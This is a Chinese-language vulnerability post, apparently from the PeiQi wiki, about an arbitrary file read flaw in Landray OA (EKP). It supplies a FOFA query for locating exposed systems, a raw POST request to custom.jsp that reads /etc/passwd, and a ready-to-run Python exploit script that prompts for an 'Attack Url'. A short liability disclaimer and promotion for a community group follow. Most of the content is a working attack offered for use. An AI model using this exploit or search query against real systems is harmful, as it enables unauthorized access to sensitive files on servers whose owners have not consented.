> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**深圳市蓝凌软件股份有限公司数字 OA(EKP) 存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。**

**二:  漏洞影响🐇**

**蓝凌 OA**

**三:  漏洞复现🐋**

```
FOFA:  app="Landray-OA系统"
```

**出现漏洞的文件为 custom.jsp,** **请求包为**

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={"body":{"file":"file:///etc/passwd"}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UGicsjEf95CAW6nYx9fytsIIwlib5jbcTwsHbwv6bafvbQ0aib8bcrCX6memWRmAsZjZ3qs9eFCnEQ/640?wx_fmt=png)

 ****四:  漏洞 POC🦉****

```
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 蓝凌OA 任意文件读取                                          \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(target_url))
        if "root:" in response.text and response.status_code == 200:
            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UGicsjEf95CAW6nYx9fyts1ZNxLwBDBnmHBFRmLgVmTZlcicO4zeDrOwclHE0yktibiaNOWNSCQxqyQ/640?wx_fmt=png)

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**